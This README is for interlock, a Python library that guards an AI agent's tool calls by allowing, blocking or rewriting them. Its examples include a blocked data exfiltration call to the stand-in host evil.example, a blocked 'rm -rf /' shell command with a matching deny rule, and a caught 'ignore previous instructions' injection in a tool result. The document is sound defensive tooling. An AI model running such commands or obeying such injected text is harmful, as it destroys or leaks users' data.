# interlock

[![CI](https://github.com/SourceShift/InterLock/actions/workflows/ci.yml/badge.svg)](https://github.com/SourceShift/InterLock/actions/workflows/ci.yml)
[![CodeQL](https://github.com/SourceShift/InterLock/actions/workflows/codeql.yml/badge.svg)](https://github.com/SourceShift/InterLock/actions/workflows/codeql.yml)
![Python 3.9+](https://img.shields.io/badge/python-3.9%2B-blue)
![Detectors: 105](https://img.shields.io/badge/detectors-105-blue)
[![License: Apache-2.0](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)

**Stop a bad tool call before your AI agent makes it.**

interlock checks every tool call your agent makes, inside the agent's own
process, and allows, blocks, or rewrites it before anything happens. No proxy,
no account, no network calls, and no dependencies.

```python
import interlock
from interlock import Blocked, guard
from interlock.detectors import network_egress_guard, pii_redaction_guard


@guard()
def http_post(url: str, body: str) -> str:
    return f"posted to {url}: {body}"


interlock.install(rules=[
    network_egress_guard(allowed_hosts=["api.acme.com"]),   # only talk to hosts you trust
    pii_redaction_guard(),                                  # mask secrets and personal data
])

http_post("https://api.acme.com/notes", "Card on file: 4111 1111 1111 1111")
# -> "posted to https://api.acme.com/notes: Card on file: [REDACTED CREDIT_CARD]"

http_post("https://evil.example/collect", "the whole customer table")
# -> raises Blocked: blocked action 'http_post': egress to 'evil.example' is not on the destination allowlist
```

The first call went through with the card number masked. The second never ran.

### See it run

[`examples/quickstart_demo.py`](examples/quickstart_demo.py) shows every verdict
in one go — allow, rewrite, block, and a check of what a tool returned:

```console
$ python examples/quickstart_demo.py
allow    -> posted to https://api.acme.com/notes: routine sync
rewrite  -> posted to https://api.acme.com/notes: Card on file: [REDACTED CREDIT_CARD]
block    -> Blocked: blocked action 'http_post': egress to 'evil.example' is not on the destination allowlist
check    -> Blocked: blocked action 'fetch_page': tool_result_injection: ignore previous instructions
```

The third call never leaves the process. The fourth is a page that tried to
smuggle an instruction in through its own text — it never reaches the agent.

## Why interlock

Agents make mistakes, and some get tricked. Sooner or later one will run
`rm -rf`, send data to a host you've never heard of, or follow instructions it
found in a web page. Most guardrails watch what the model *says*. interlock
watches what it *does*, at the last moment you can still say no.

- **Three verdicts, not two.** A call can be allowed, blocked, or **rewritten**
  (mask a secret, cap an amount, force a dry run), so safety doesn't always cost
  you the task.
- **Checks results too.** Injected instructions arrive in tool output: a web
  page, an email, a document. interlock checks what tools return before your
  agent reads it.
- **One policy everywhere.** The same rules guard decorated functions, MCP
  sessions, LangChain tools, your own tool loop, and Node.js agents.
- **105 ready-made detectors** for prompt injection, SQL and shell injection,
  secret and PII redaction, SSRF, egress, MCP server trust, budgets, and loops.
- **Built for real deployments:** per-tenant policies with safe delegation to
  sub-agents, a tamper-evident audit log, and an OS sandbox for the subprocesses
  your agent launches.
- **Nothing to sign up for.** Pure Python, no runtime dependencies, works
  offline.

```mermaid
flowchart LR
    agent(["your agent"]) -->|"tool call"| check{"interlock<br/>your rules"}
    check -->|"allow"| run["tool runs"]
    check -->|"rewrite"| safer["tool runs with<br/>safer arguments"]
    check -->|"block"| stop["Blocked<br/>nothing runs"]
    run --> rcheck{"result<br/>checked"}
    safer --> rcheck
    rcheck -->|"clean"| agent
    rcheck -->|"injected"| stop
    agent -.->|"launches a process"| brace["BRACE sandbox"]
```

## Install

```bash
pip install "git+https://github.com/SourceShift/InterLock.git"

# with LangChain support
pip install "interlock-guard[langchain] @ git+https://github.com/SourceShift/InterLock.git"
```

Python 3.9 or newer. interlock isn't on PyPI yet, so install it from GitHub, and
pin a commit for production.

## Quickstart

**1. Guard your tools.** Put `@guard()` on the functions your agent calls:

```python
from interlock import guard

@guard()
def run_shell(cmd: str) -> str: ...

@guard()
def query_db(sql: str, limit: int = 1000) -> str: ...
```

**2. Install rules.** A rule takes a call and blocks it, rewrites it, or returns
`None` for "no opinion":

```python
import interlock
from interlock import Decision, deny_when

def cap_rows(event):
    if event.action == "query_db" and event.args.get("limit", 0) > 100:
        return Decision.modify({"limit": 100}, reason="row limit capped")
    return None

interlock.install(rules=[
    deny_when(lambda e: "rm -rf" in str(e.args.get("cmd", "")), reason="destructive command"),
    cap_rows,
])

run_shell("rm -rf /")              # raises Blocked; the command never runs
query_db("SELECT * FROM orders")   # runs with limit=100
```

**3. Try new rules safely.** Swap `@guard()` for `@monitor()` and decisions are
logged but never enforced, so you can see what a rule *would* do to real traffic
first.

The [getting started tutorial](docs/getting-started.md) walks through all of this
with real output, plus detectors, result checks, and the tool-name pitfall that
catches most people.

## What's in the box

| Feature | What it does | Guide |
|---|---|---|
| Rules | Python functions that block, rewrite, or check results | [Writing rules](docs/guides/writing-rules.md) |
| Detectors | 105 ready-made rules, grouped by attack | [Using detectors](docs/guides/detectors.md) · [catalog](docs/reference/detectors.md) |
| MCP trust | Allowlist servers, pin tool schemas, catch changed tool listings, time-limited grants | [MCP](docs/guides/mcp.md) |
| Scopes | Per-tenant and per-agent policies; sub-agents can't exceed their parent | [Scopes](docs/guides/scopes.md) |
| Audit log | Chained, signed receipts of every decision; arguments hashed, not stored | [Audit log](docs/guides/audit-log.md) |
| BRACE sandbox | Runs subprocesses under bubblewrap (Linux) or Seatbelt (macOS), built from your policy | [Sandbox](docs/guides/sandbox.md) |
| Node.js client | Guards JS agents with the same Python policy through a local daemon | [js/README.md](js/README.md) |

## Works with

| You have | Use |
|---|---|
| Your own Python functions | `@guard()` |
| An MCP client session | `guard_mcp_session(session)` |
| LangChain tools | `guard_langchain_tools(tools)` |
| An OpenAI, Anthropic, or other tool loop | `enforce_tool_call` / `enforce_tool_result` |
| A Node.js agent | the `interlock-guard` npm package + `interlock-sidecar` |

Each one is covered in [integrations](docs/guides/integrations.md).

## How is this different?

| Kind of tool | Examples | What it checks | How interlock relates |
|---|---|---|---|
| Content guardrails | NeMo Guardrails, Guardrails AI, LlamaFirewall | Prompts and model responses, often with ML classifiers or extra LLM calls | interlock checks *actions* (tool calls and their results) with plain rules. Use both: a classifier for content, interlock for what the agent does |
| Agent trace rules | Invariant Guardrails | Patterns across an agent's trace, as a library or a gateway, in its own rule language | interlock rules are plain Python, run in-process with no dependencies, and can rewrite a call as well as block it |
| MCP gateways | Lasso MCP Gateway | MCP traffic, from a proxy between client and servers | interlock sees calls of any kind inside your process, MCP or not, with the real arguments |
| Sandboxes | sandbox-runtime, E2B, Leash | What a process can reach at the OS or VM level | Sandboxes don't know what a tool call means. interlock checks the call, and its BRACE sandbox confines what it can't see, from the same policy |

## Know the limits

interlock is a strong layer, not a complete defence. The ones that matter most:

- **No rules means everything is allowed.** Check that rules are installed at
  startup.
- **Blocking a result doesn't undo the tool.** Results are checked after the
  tool ran; a block keeps the output from your agent, but side effects stand.
- **Detectors match patterns, not meaning.** A reworded attack can get past
  them. Allowlists don't have this weakness.
- **It trusts your agent's code, not its decisions.** Malicious code in the same
  process can bypass it. Run untrusted code in the sandbox.
- **Many detectors only look at certain tool names.** Check the catalog's
  "Scoped to" column.

The [security model](docs/security-model.md) has the full list, including the
settings that weaken protection.

## Documentation

Start with [getting started](docs/getting-started.md), then
[concepts](docs/concepts.md). Everything else is indexed on the
[docs home page](docs/overview.md): guides for each task, the
[Python API](docs/reference/python-api.md), the
[detector catalog](docs/reference/detectors.md), and the
[sidecar reference](docs/reference/sidecar.md).

## Status

**Alpha (v0.0.1).** The core API is stable and covered by over 2,300 tests. Not
yet on PyPI or npm. Next on the [roadmap](ROADMAP.md): an "ask a human"
verdict, a false-positive harness for the detectors, rules over data flow
between tools, declarative YAML/JSON policies, and automatic interception of MCP
clients and model SDKs.

## Contributing

Bug reports, detectors, and docs fixes are welcome. See
[CONTRIBUTING.md](CONTRIBUTING.md) for setup, conventions, and how to add a
detector. This project follows the
[Contributor Covenant](CODE_OF_CONDUCT.md); by taking part you agree to it.

Found a way *past* interlock rather than a bug in it? Report it privately — see
[SECURITY.md](SECURITY.md).

Release history is in [CHANGELOG.md](CHANGELOG.md).

## License

Apache-2.0. See [LICENSE](LICENSE).
